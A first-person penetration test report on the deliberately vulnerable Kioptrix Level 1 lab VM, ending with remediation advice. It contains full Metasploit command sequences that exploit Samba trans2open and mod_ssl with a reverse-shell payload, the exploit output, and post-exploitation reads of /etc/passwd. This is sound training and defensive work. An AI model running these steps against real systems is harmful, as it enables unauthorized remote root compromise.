# Technical Security Assessment Report

## Kioptrix Level 1 - Penetration Testing

---

**Document Information**

| Field                 | Details                                          |
| --------------------- | ------------------------------------------------ |
| **Report Title**      | Technical Security Assessment - Kioptrix Level 1 |
| **Client/Project**    | VulnHub Lab Exercise                             |
| **Assessment Type**   | Black-box Penetration Test                       |
| **Target System**     | Kioptrix Level 1 VM                              |
| **Target IP Address** | 192.168.100.7                                    |
| **Assessment Date**   | 2026-08-30                                       |
| **Report Date**       | 2026-09-03                                       |
| **Assessor**          | Deborah Ogutu                                    |
| **Classification**    | Confidential                                     |

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Scope and Methodology](#scope-and-methodology)
3. [Reconnaissance and Enumeration](#reconnaissance-and-enumeration)
4. [Vulnerability Assessment](#vulnerability-assessment)
5. [Exploitation](#exploitation)
6. [Post-Exploitation](#post-exploitation)
7. [Risk Analysis](#risk-analysis)
8. [Remediation Recommendations](#remediation-recommendations)
9. [Conclusion](#conclusion)
10. [Appendices](#appendices)

---

## 1. Executive Summary

### 1.1 Overview

I carried out a penetration test against the Kioptrix Level 1 virtual machine to see what vulnerabilities were present and how much access an attacker could gain from them. I approached the assessment as a black-box test, meaning I started without detailed information about the target and first had to discover the system and its exposed services.

### 1.2 Key Findings

The assessment found several serious security issues. The most important one was the Samba vulnerability, which allowed me to gain root access to the machine.

| Finding                                                | Severity        | Status      |
| ------------------------------------------------------ | --------------- | ----------- |
| Samba 2.2.x trans2open Buffer Overflow (CVE-2003-0201) |    **Critical** | Exploited ✓ |
| Apache 1.3.20/mod_ssl Vulnerabilities                  |    **High**     | Identified  |
| SSHv1 Protocol Support                                 |    **Medium**   | Identified  |
| Outdated Linux Kernel (2.4.x)                          |    **Medium**   | Identified  |

### 1.3 Impact Assessment

* **Confidentiality:** Complete compromise - all system data could be accessed
* **Integrity:** Full system control - files could be modified or deleted
* **Availability:** Service disruption was possible because an attacker could interfere with running services
* **Privilege Escalation:** Not required - the Samba exploit provided root access directly

### 1.4 Overall Risk Rating

 **CRITICAL** - Immediate remediation required

---

## 2. Scope and Methodology

### 2.1 Assessment Scope

**In-Scope Systems:**

* Kioptrix Level 1 VM (192.168.100.7)
* All open network services
* Operating system and applications

**Out-of-Scope:**

* Physical security
* Social engineering
* Denial of Service (DoS) attacks

### 2.2 Testing Methodology

I followed a step-by-step penetration testing process, starting with network discovery and ending with post-exploitation analysis.

| Phase                         | Description                                   | Tools Used                    |
| ----------------------------- | --------------------------------------------- | ----------------------------- |
| **1. Reconnaissance**         | Network discovery and target identification   | netdiscover, arp-scan, nmap   |
| **2. Enumeration**            | Port scanning and service fingerprinting      | nmap                          |
| **3. Vulnerability Analysis** | Identification of exploitable services        | Manual analysis, nmap scripts |
| **4. Exploitation**           | Gaining unauthorized access                   | Metasploit Framework          |
| **5. Post-Exploitation**      | System exploration and privilege verification | Linux commands                |
| **6. Documentation**          | Reporting and evidence collection             | Markdown, screenshots         |

### 2.3 Testing Constraints

* Test environment: Local virtual network (host-only mode)
* No restrictions on exploitation techniques
* No restrictions on post-exploitation activities
* Goal: Acquire root access and capture proof flag

### 2.4 Tools Used

| Tool                 | Version | Purpose                               |
| -------------------- | ------- | ------------------------------------- |
| netdiscover          | Latest  | Network discovery                     |
| Nmap                 | 7.x     | Port scanning and service enumeration |
| Metasploit Framework | Latest  | Exploitation                          |
| Linux Command Line   | -       | Post-exploitation                     |

---

## 3. Reconnaissance and Enumeration

### 3.1 Network Discovery

I started the assessment by checking the local network to find the IP address of the Kioptrix machine.

**Command:**

```bash
sudo netdiscover -r 192.168.100.0/24
```

**Results:**

```
Currently scanning: 192.168.100.0/24

IP              MAC Address       Count   Len    MAC Vendor
------------------------------------------------------------------
192.168.100.7   08:00:27:1F:F6:3A    1      60    PCS Systemtechnik GmbH
```

**Analysis:**

* The MAC address `08:00:27` showed that the machine was running in VirtualBox
* I identified `192.168.100.7` as the target
* I confirmed this by checking the available ports and found ports 80 and 139 open

### 3.2 Port Scanning

After identifying the target, I ran a more detailed Nmap scan to find the open ports, services, versions, and other information about the machine.

**Command:**

```bash
sudo nmap -sV -sC -O -A 192.168.100.7
```

**Open Ports Summary:**

| Port      | Service     | Version                           |
| --------- | ----------- | --------------------------------- |
| 22/tcp    | SSH         | OpenSSH 2.9p2                     |
| 80/tcp    | HTTP        | Apache httpd 1.3.20               |
| 111/tcp   | RPC         | rpcbind 2                         |
| 139/tcp   | NetBIOS-SSN | Samba smbd 2.2.x                  |
| 443/tcp   | HTTPS       | Apache httpd 1.3.20 mod_ssl/2.8.4 |
| 32768/tcp | Status      | RPC #100024                       |

### 3.3 Operating System Detection

**Results:**

* **OS:** Linux 2.4.x
* **Kernel:** 2.4.9 - 2.4.18
* **Distribution:** Red Hat Linux
* **Hostname:** KIOPTRIX (from NetBIOS)

### 3.4 Service Enumeration Details

#### 3.4.1 SSH (Port 22)

```
Service: OpenSSH 2.9p2
Protocol: SSHv1 and SSHv2
Host Keys:
  - RSA1: b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86
  - DSA: 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71
  - RSA: ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81
Vulnerability: SSHv1 supported (deprecated protocol)
```

The SSH service was running an old version of OpenSSH and also supported SSHv1. Since SSHv1 is deprecated, I noted this as another security weakness.

#### 3.4.2 HTTP (Port 80)

```
Service: Apache HTTP Server
Version: 1.3.20
Build: (Unix) (Red-Hat Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
HTTP Methods: TRACE (potentially risky)
Title: Test page for the Apache Web Server on Red Hat Linux
```

The HTTP service was running Apache 1.3.20, which is a very old version. The scan also showed that the TRACE method was enabled, so I included this service in the vulnerability review.

#### 3.4.3 SMB/NetBIOS (Port 139)

```
Service: Samba smbd
Version: 2.2.x
Workgroup: QMYGROUP
NetBIOS Name: KIOPTRIX
Critical Vulnerability: trans2open buffer overflow (CVE-2003-0201)
```

The Samba service stood out as the main attack path. The version was vulnerable to the trans2open buffer overflow, which could allow remote code execution.

#### 3.4.4 HTTPS (Port 443)

```
Service: Apache HTTP Server with SSL/TLS
Version: 1.3.20 mod_ssl/2.8.4 OpenSSL/0.9.6b
SSL Certificate:
  - Common Name: localhost.localdomain
  - Valid From: 2009-09-26
  - Valid To: 2010-09-26 (EXPIRED)
SSLv2: Supported (vulnerable)
```

The HTTPS service also had several issues. The SSL certificate had expired years ago and SSLv2 was still supported, which is considered insecure.

---

## 4. Vulnerability Assessment

### 4.1 Vulnerability Summary

| ID   | Service       | Vulnerability              | CVE           | CVSS Score | Priority    |
| ---- | ------------- | -------------------------- | ------------- | ---------- | ----------- |
| V-01 | Samba 2.2.x   | trans2open Buffer Overflow | CVE-2003-0201 | 10.0       |    Critical |
| V-02 | Apache 1.3.20 | Multiple Exploits          | Various       | 7.5        |    High     |
| V-03 | mod_ssl 2.8.4 | OpenSSL Buffer Overflow    | CVE-2002-0082 | 7.5        |    High     |
| V-04 | OpenSSH 2.9p2 | SSHv1 Protocol Support     | CVE-2001-1473 | 5.0        |    Medium   |
| V-05 | Linux 2.4.x   | Outdated Kernel            | Various       | 5.0        |    Medium   |

### 4.2 Critical Vulnerability Analysis

#### V-01: Samba trans2open Buffer Overflow (CVE-2003-0201)

**Description:**

The Samba 2.2.x service has a buffer overflow vulnerability in the `trans2open` function that processes SMB requests. During the assessment, this vulnerability was important because it could be exploited remotely and could provide root-level access.

**Affected Versions:**

* Samba versions prior to 2.2.8
* Samba 2.2.0 through 2.2.7a

**Exploitability:**

* Exploit available: Metasploit module (`exploit/linux/samba/trans2open`)
* Remote exploitation possible
* No authentication required
* Immediate root access

**Impact:**

* Complete system compromise
* Root-level access to the system
* Ability to modify, delete, or exfiltrate any data
* Installation of backdoors and malware

**Proof of Concept:**

I successfully exploited this vulnerability during the assessment using the Metasploit Framework and obtained a root command shell.

### 4.3 Medium Priority Vulnerabilities

#### V-04: SSHv1 Protocol Support

**Description:**

The SSH service supported the older SSHv1 protocol. This protocol is deprecated and has known security weaknesses, making it less secure than SSHv2.

**Impact:**

* Potential for man-in-the-middle attacks
* Reduced security during SSH connections
* Information disclosure possible

#### V-05: Outdated Linux Kernel

**Description:**

The target was running Linux kernel 2.4.x, which is extremely old and contains many known security issues.

**Impact:**

* Exposure to multiple kernel-level exploits
* Poor security feature support
* Increased risk of privilege escalation

### 4.4 Vulnerability Prioritization Matrix

| Priority | Vulnerability           | Exploit Available | Skill Level Required |
| -------- | ----------------------- | ----------------- | -------------------- |
|    1     | Samba trans2open        | Yes (Metasploit)  | Beginner             |
|    2     | mod_ssl buffer overflow | Yes (Metasploit)  | Intermediate         |
|    3     | Apache 1.3.20 exploits  | Yes               | Intermediate         |
|    4     | SSHv1 protocol support  | Limited           | Advanced             |
|    5     | Outdated kernel         | Yes               | Intermediate         |

---

## 5. Exploitation

### 5.1 Exploit Selection

**Primary Vector:** Samba trans2open buffer overflow (CVE-2003-0201)

**Rationale:**

I selected the Samba vulnerability as the primary attack path because it was the most straightforward option available. A working Metasploit module was available, authentication was not required, and the exploit could provide root access directly.

* Most reliable and straightforward exploit
* Immediate root access
* No privilege escalation required
* Well-documented with Metasploit module

### 5.2 Exploit Execution

#### 5.2.1 Metasploit Setup

```msf
msf> use exploit/linux/samba/trans2open
msf exploit(linux/samba/trans2open)> set RHOSTS 192.168.100.7
msf exploit(linux/samba/trans2open)> set RPORT 139
msf exploit(linux/samba/trans2open)> set PAYLOAD linux/x86/shell_reverse_tcp
msf exploit(linux/samba/trans2open)> set LHOST 192.168.100.3
msf exploit(linux/samba/trans2open)> set LPORT 4444
msf exploit(linux/samba/trans2open)> exploit
```

#### 5.2.2 Exploit Output

```
[*] Started reverse TCP handler on 192.168.100.3:4444
[*] 192.168.100.7:139 - Trying return address 0xbfffffdc...
[*] 192.168.100.7:139 - Trying return address 0xfffffffdc...
[*] 192.168.100.7:139 - Trying return address 0xbffffcfc...
[*] 192.168.100.7:139 - Trying return address 0xbffffbfc...
[*] 192.168.100.7:139 - Trying return address 0xbffffafc...
[*] 192.168.100.7:139 - Trying return address 0xbffff9fc...
[*] 192.168.100.7:139 - Trying return address 0xbffff8fc...
[*] Command shell session 1 opened (192.168.100.3:4444 -> 192.168.100.7:32769)
[*] Command shell session 2 opened (192.168.100.3:4444 -> 192.168.100.7:32770)
[*] Command shell session 3 opened (192.168.100.3:4444 -> 192.168.100.7:32771)
[*] Command shell session 4 opened (192.168.100.3:4444 -> 192.168.100.7:32772)
```

### 5.3 Exploitation Success

* **Status:** **SUCCESSFUL**
* **Access Level:** Root
* **Session Type:** Command shell
* **Number of Sessions:** 4

The exploit worked successfully and gave me four command shell sessions on the target. The important part was that the access was already at the root level, so there was no separate privilege escalation step needed.

### 5.4 Alternative Exploitation Vectors (Not Used)

#### 5.4.1 mod_ssl Exploit (CVE-2002-0082)

If the Samba exploit had not worked, I could have tried the mod_ssl vulnerability as an alternative attack path:

```msf
msf> use exploit/linux/ssl/openssl_too_open
msf exploit(linux/ssl/openssl_too_open)> set RHOSTS 192.168.100.7
msf exploit(linux/ssl/openssl_too_open)> set RPORT 443
msf exploit(linux/ssl/openssl_too_open)> set PAYLOAD linux/x86/shell_reverse_tcp
msf exploit(linux/ssl/openssl_too_open)> set LHOST 192.168.100.3
msf exploit(linux/ssl/openssl_too_open)> set LPORT 4444
msf exploit(linux/ssl/openssl_too_open)> exploit
```

---

## 6. Post-Exploitation

### 6.1 Confirming Root Access

After getting the shell, I first checked the current privileges to make sure the exploit had actually given me root access.

```bash
id
# Output: uid=0(root) gid=0(root) groups=99(nobody)

whoami
# Output: root
```

**Analysis:** The `id` and `whoami` commands confirmed that the shell was running as root (`uid=0`). This meant the target had been fully compromised.

### 6.2 System Information

I then checked the operating system and kernel information to understand more about the compromised machine.

```bash
uname -a
# Output: Linux kioptrix 2.4.9-34 #1 Wed Apr 11 12:32:35 EDT 2001 i686 unknown

cat /etc/redhat-release
# Output: Red Hat Linux release 7.0 (Guinness)
```

### 6.3 User Enumeration

**Command:**

```bash
cat /etc/passwd
```

**Users Identified:**

| Username | UID | GID | Home Directory | Shell         |
| -------- | --- | --- | -------------- | ------------- |
| root     | 0   | 0   | /root          | /bin/bash     |
| bin      | 1   | 1   | /bin           | /sbin/nologin |
| daemon   | 2   | 2   | /sbin          | /sbin/nologin |
| adm      | 3   | 4   | /var/adm       | /sbin/nologin |
| lp       | 4   | 7   | /var/spool/lpd | /sbin/nologin |
| nobody   | 99  | 99  | /              | /sbin/nologin |
| apache   | 48  | 48  | /var/www       | /bin/false    |
| john     | 500 | 500 | /home/         | /bin/bash     |
| harold   | 501 | 501 | /home/harold   | /bin/bash     |

This showed both system accounts and regular user accounts on the machine. Since I already had root access, I was able to read the account information.

### 6.4 Filesystem Exploration

#### Root Directory (/root)

```
total 12
drwxr-x---   2 root root 1024 Sep 26  2009 .
drwxr-xr-x  19 root root 1024 Aug 30 13:09 ..
-rw-r--r--   1 root root 1126 Aug 23  1995 .Xresources
-rw-------   1 root root  147 Oct 12  2009 .bash_history
-rw-r--r--   1 root root   24 Jun 10  2000 .bash_logout
-rw-r--r--   1 root root  234 Jul  5  2001 .bash_profile
-rw-r--r--   1 root root  176 Aug 23  1995 .bashrc
-rw-r--r--   1 root root  210 Jun 10  2000 .cshrc
-rw-r--r--   1 root root  196 Jul 11  2000 .tcshrc
-rw-r--r--   1 root root 1303 Sep 26  2009 anaconda-ks.cfg
```

#### Home Directories

```
/home:
harold/
john/
lost+found/
```

I also checked the root and home directories to see what files and user directories were available after gaining access.

### 6.5 Finding Flags

**Command:**

```bash
find / -name *flag* 2>/dev/null
```

**Results (Relevant):**

```
/usr/sbin/rootflags  ← Target flag file
```

This search located the flag file at `/usr/sbin/rootflags`.

### 6.6 Reading the Flag

```bash
cat /usr/sbin/rootflags
```

**Flag Content:** [REDACTED - Proof of Compromise]

### 6.7 Running Processes

To see what was currently running on the system, I checked the active processes.

```bash
ps aux
```

**Key Processes:**

| Process | User        | Description           |
| ------- | ----------- | --------------------- |
| init    | root        | System initialization |
| sshd    | root        | SSH daemon            |
| smbd    | root        | Samba daemon (root)   |
| nmbd    | root        | NetBIOS daemon (root) |
| httpd   | root/apache | Apache web server     |

**Critical Observation:** SMB and Apache services were running with root privileges, which could increase the impact of vulnerabilities affecting these services.

### 6.8 Welcome Message

```bash
cat /etc/motd /etc/issue
```

```
Welcome to Kioptrix Level 1 Penetration and Assessment Environment

--The object of this game:
|_Acquire "root" access to the machine.

There are many ways this can be done, try and find more than one way to appreciate this exercise.

DISCLAIMER: Kioptrix is not responsible for any damage or instability caused by running, installing or using this VM image.

WARNING: This is a vulnerable system, DO NOT run this OS in a production environment. Nor should you give this system access to the outside world (the Internet - or Interwebs..)

Good Luck and have fun!
```

**Analysis:** The welcome message confirmed that the main objective of the lab was to obtain root access and also warned that the system was intentionally vulnerable.

### 6.9 Services and Network

Finally, I checked which network services were listening on the machine.

```bash
netstat -tuln
```

| Protocol | Local Address | Foreign Address | State  | Service |
| -------- | ------------- | --------------- | ------ | ------- |
| tcp      | 0.0.0.0:22    | 0.0.0.0:*       | LISTEN | SSH     |
| tcp      | 0.0.0.0:80    | 0.0.0.0:*       | LISTEN | HTTP    |
| tcp      | 0.0.0.0:111   | 0.0.0.0:*       | LISTEN | RPC     |
| tcp      | 0.0.0.0:139   | 0.0.0.0:*       | LISTEN | SMB     |
| tcp      | 0.0.0.0:443   | 0.0.0.0:*       | LISTEN | HTTPS   |

---

## 7. Risk Analysis

### 7.1 Risk Assessment Matrix

| Impact   | Likelihood | Risk Level      | Action Required        |
| -------- | ---------- | --------------- | ---------------------- |
| Critical | High       |    **Critical** | Immediate action       |
| High     | Medium     |    **High**     | Action within 1 month  |
| Medium   | Medium     |    **Medium**   | Action within 3 months |
| Low      | Low        |    **Low**      | Accept or monitor      |

### 7.2 Detailed Risk Analysis

#### CRITICAL: Samba trans2open Vulnerability (V-01)

| Factor                      | Assessment                             |
| --------------------------- | -------------------------------------- |
| **Vulnerability**           | Samba 2.2.x trans2open buffer overflow |
| **Exploitability**          | Easy - Metasploit module available     |
| **Authentication Required** | No                                     |
| **Impact**                  | Complete system compromise             |
| **Risk Rating**             |    **CRITICAL**                        |
| **Recommendation**          | Immediate patching required            |

The Samba vulnerability was the biggest issue found during the assessment because it could be exploited remotely without authentication and resulted in root access.

#### HIGH: Apache/mod_ssl Vulnerabilities (V-02, V-03)

| Factor                      | Assessment                                |
| --------------------------- | ----------------------------------------- |
| **Vulnerability**           | Apache 1.3.20 and mod_ssl vulnerabilities |
| **Exploitability**          | Medium - public exploits available        |
| **Authentication Required** | No                                        |
| **Impact**                  | Remote code execution                     |
| **Risk Rating**             |    **HIGH**                               |
| **Recommendation**          | Upgrade to current versions               |

These vulnerabilities were not used because the Samba exploit was successful, but they still represent serious risks because the web services were running very old software.

#### MEDIUM: SSHv1 and Outdated Kernel (V-04, V-05)

| Factor                      | Assessment                                   |
| --------------------------- | -------------------------------------------- |
| **Vulnerability**           | SSHv1 support, outdated kernel               |
| **Exploitability**          | Low to Medium                                |
| **Authentication Required** | Varies                                       |
| **Impact**                  | Information disclosure, privilege escalation |
| **Risk Rating**             |    **MEDIUM**                                |
| **Recommendation**          | Upgrade and harden configuration             |

### 7.3 Business Impact

| Impact Category     | Description                            | Severity |
| ------------------- | -------------------------------------- | -------- |
| **Confidentiality** | Complete data exposure possible        | Critical |
| **Integrity**       | Full system control, data manipulation | Critical |
| **Availability**    | Service disruption possible            | High     |
| **Compliance**      | Violation of security standards        | High     |
| **Reputational**    | Loss of trust if compromised           | High     |

---

## 8. Remediation Recommendations

### 8.1 Critical Priorities (Immediate Action Required)

#### R-01: Update Samba Service

**Issue:** Samba 2.2.x vulnerable to trans2open buffer overflow (CVE-2003-0201)

**Recommendations:**

1. **Immediate Action:**

   ```bash
   # Update Samba to a patched version
   yum update samba
   # Or compile from source
   wget https://download.samba.org/pub/samba/stable/samba-4.19.0.tar.gz
   ```

2. **If Patching is Not Possible:**

   * Restrict SMB access using firewall rules:

     ```bash
     iptables -A INPUT -p tcp --dport 139 -j DROP
     iptables -A INPUT -p tcp --dport 445 -j DROP
     ```
   * Isolate the system from untrusted networks
   * Consider decomissioning the system

**Expected Outcome:** This should remove the main attack path used during the assessment.

#### R-02: Update Apache and OpenSSL

**Issue:** Apache 1.3.20 and OpenSSL 0.9.6b contain critical vulnerabilities

**Recommendations:**

1. **Immediate Action:**

   ```bash
   # Update to current version
   yum update httpd mod_ssl openssl
   ```

2. **Disable SSLv2/v3:**

   ```apache
   # In httpd.conf
   SSLProtocol all -SSLv2 -SSLv3
   SSLCipherSuite HIGH:MEDIUM:!aNULL:!MD5
   ```

**Expected Outcome:** Updating these components would remove the known vulnerabilities associated with the old Apache, mod_ssl, and OpenSSL versions.

### 8.2 High Priorities (Within 1 Month)

#### R-03: Disable SSHv1

**Issue:** SSHv1 protocol support weakens security

**Recommendation:**

```bash
# In /etc/ssh/sshd_config
Protocol 2
# Restart SSH
service sshd restart
```

#### R-04: Update Linux Kernel

**Issue:** Kernel 2.4.x is outdated and contains vulnerabilities

**Recommendation:**

1. Upgrade to a supported kernel version
2. Consider migrating to a modern Linux distribution
3. Apply security patches regularly

### 8.3 Medium Priorities (Within 3 Months)

#### R-05: Implement Security Hardening

**Recommendations:**

1. **User Account Management:**

   * Remove unnecessary user accounts
   * Enforce strong password policies
   * Implement account lockout policies

2. **Service Hardening:**

   * Disable unnecessary services
   * Run services with least privilege
   * Implement application whitelisting

3. **System Hardening:**

   * Enable system logging and auditing
   * Implement intrusion detection
   * Regular security updates

#### R-06: Network Segmentation

**Recommendation:**

* Place legacy systems in isolated network segments
* Implement firewall rules to restrict access
* Monitor network traffic for anomalies

### 8.4 Long-term Recommendations

#### R-07: System Modernization

**Recommendations:**

1. Migrate to a modern operating system
2. Implement regular security patching
3. Establish security monitoring program
4. Conduct regular security assessments

#### R-08: Security Awareness

**Recommendations:**

1. Train administrators on security best practices
2. Establish incident response procedures
3. Document security policies and procedures
4. Conduct regular security reviews

### 8.5 Remediation Priority Matrix

| Priority | Recommendation        | Effort | Impact | Timeline  |
| -------- | --------------------- | ------ | ------ | --------- |
|    1     | Update Samba          | Medium | High   | Immediate |
|    2     | Update Apache/OpenSSL | Medium | High   | Immediate |
|    3     | Disable SSHv1         | Low    | Medium | 1 Month   |
|    4     | Update Kernel         | High   | High   | 1 Month   |
|    5     | System Hardening      | Medium | Medium | 3 Months  |
|    6     | Network Segmentation  | High   | Medium | 3 Months  |
|    7     | Modernization         | High   | High   | 6 Months  |

---

## 9. Conclusion

### 9.1 Assessment Summary

The penetration test against Kioptrix Level 1 successfully showed how vulnerable the system was. Starting from network discovery, I was able to identify exposed services, find the vulnerable Samba version, exploit it, and obtain root access.

**Key Findings:**

1. ✅ **System Compromised:** Root access achieved
2. ✅ **Flag Captured:** Proof of compromise obtained
3. ✅ **Vulnerability Identified:** Samba trans2open (CVE-2003-0201)
4. ✅ **Multiple Attack Vectors:** SMB, mod_ssl, SSHv1

### 9.2 Impact Summary

| Metric                       | Result                   |
| ---------------------------- | ------------------------ |
| **Initial Access Vector**    | Samba trans2open exploit |
| **Time to Compromise**       | < 30 minutes             |
| **Privilege Level Obtained** | Root                     |
| **Data Exposure**            | Complete                 |
| **System Control**           | Full                     |
| **Risk Level**               | **Critical**          |

### 9.3 Lessons Learned

1. **Patch Management is Critical:** I saw how dangerous old and unsupported services can be when they are left unpatched.
2. **Defense in Depth:** Having multiple security controls is important because one vulnerable service can become an entry point.
3. **Regular Assessments:** Security testing helps identify vulnerabilities before they can be abused.
4. **Network Segmentation:** Systems running old or vulnerable software should be isolated from more important systems.
5. **Legacy Systems:** Older systems need extra attention because they may no longer receive security updates.

### 9.4 Final Statement

**The Kioptrix Level 1 system is critically vulnerable and would require immediate remediation in a real environment.** The assessment showed that an attacker with basic penetration testing skills could identify the vulnerable Samba service and use it to gain complete control of the system. This lab was useful for understanding how reconnaissance, vulnerability identification, exploitation, and post-exploitation fit together during a penetration test.

---

## 10. Appendices

### Appendix A: Vulnerability Details

#### A.1 CVE-2003-0201 - Samba trans2open Buffer Overflow

| Detail                | Information                                    |
| --------------------- | ---------------------------------------------- |
| **CVE ID**            | CVE-2003-0201                                  |
| **Description**       | Buffer overflow in Samba's trans2open function |
| **Affected Versions** | Samba 2.2.0 through 2.2.7a                     |
| **Attack Type**       | Remote code execution                          |
| **Authentication**    | None required                                  |
| **Impact**            | Complete system compromise                     |
| **CVSS Score**        | 10.0 (Critical)                                |
| **Source**            | NVD                                            |

#### A.2 CVE-2002-0082 - mod_ssl Buffer Overflow

| Detail                | Information                |
| --------------------- | -------------------------- |
| **CVE ID**            | CVE-2002-0082              |
| **Description**       | Buffer overflow in mod_ssl |
| **Affected Versions** | OpenSSL 0.9.6b             |
| **Attack Type**       | Remote code execution      |
| **Authentication**    | None required              |
| **Impact**            | Remote code execution      |
| **CVSS Score**        | 7.5 (High)                 |
| **Source**            | NVD                        |

### Appendix B: Command Reference

#### B.1 Nmap Commands

```bash
# Network discovery
sudo netdiscover -r 192.168.100.0/24

# Full port scan
sudo nmap -sV -sC -O -A 192.168.100.7

# Quick port scan
sudo nmap -p- --min-rate 1000 192.168.100.7

# Service detection
sudo nmap -sV -p 22,80,139,443 192.168.100.7
```

#### B.2 Metasploit Commands

```msf
# Start Metasploit
sudo msfconsole

# Load Samba exploit
use exploit/linux/samba/trans2open

# Set options
set RHOSTS 192.168.100.7
set RPORT 139
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.100.3
set LPORT 4444

# Execute exploit
exploit
```

#### B.3 Post-Exploitation Commands

```bash
# Verify root access
id
whoami

# System information
uname -a
cat /etc/redhat-release

# User enumeration
cat /etc/passwd

# Explore filesystem
ls -la /root
ls -la /home

# Find flags
find / -name *flag* 2>/dev/null

# View processes
ps aux

# View network connections
netstat -tuln
```

### Appendix C: Evidence File List

| File                    | Description               |
| ----------------------- | ------------------------- |
| `netdiscover.png`       | Network discovery results |
| `nmap-full-scan.txt`    | Complete Nmap scan output |
| `open-ports-summary.md` | Open ports documentation  |
| `service-versions.txt`  | Service version details   |
| `metasploit-output.txt` | Exploitation log          |
| `root-shell.png`        | Proof of root access      |
| `flag-content.txt`      | Captured flag             |
| `system-info.txt`       | System information        |

### Appendix D: Screenshots

**D.1 Network Discovery**

![Network Discovery](../evidence/screenshots/01-netdiscover.png)
*Figure 1: netdiscover output showing target IP*

**D.2 Port Scanning**

![Nmap Scan](../evidence/screenshots/02-nmap-scan.png)
*Figure 2: Full Nmap scan results*

**D.3 Exploitation**

![Metasploit Exploit](../evidence/screenshots/03-metasploit-exploit.png)
*Figure 3: Successful exploitation using Metasploit*

**D.4 Root Access**

![Root Shell](../evidence/screenshots/04-root-shell.png)
*Figure 4: Confirmed root access*

### Appendix E: Glossary

| Term              | Definition                                                                          |
| ----------------- | ----------------------------------------------------------------------------------- |
| **CVE**           | Common Vulnerabilities and Exposures - Standard identifier for vulnerabilities      |
| **CVSS**          | Common Vulnerability Scoring System - Standard for assessing vulnerability severity |
| **Exploit**       | Code that takes advantage of a vulnerability                                        |
| **Nmap**          | Network mapping tool for discovering hosts and services                             |
| **Metasploit**    | Penetration testing framework for developing and executing exploits                 |
| **SMB**           | Server Message Block - Network file sharing protocol                                |
| **Root**          | Superuser/administrative account on Unix/Linux systems                              |
| **Shell**         | Command-line interface to interact with the operating system                        |
| **Payload**       | Code executed after successful exploitation                                         |
| **Reverse Shell** | Connection initiated from the target back to the attacker                           |

### Appendix F: References

**Vulnerability Databases:**

* [NVD - National Vulnerability Database](https://nvd.nist.gov/)
* [CVE - Common Vulnerabilities and Exposures](https://cve.mitre.org/)
* [Exploit-DB](https://www.exploit-db.com/)

**Tools Documentation:**

* [Nmap Documentation](https://nmap.org/docs.html)
* [Metasploit Documentation](https://docs.metasploit.com/)
* [Linux Man Pages](https://linux.die.net/man/)

**Training Resources:**

* [VulnHub - Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
* [Penetration Testing Execution Standard (PTES)](http://www.pentest-standard.org/)
* [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

**END OF REPORT**

---
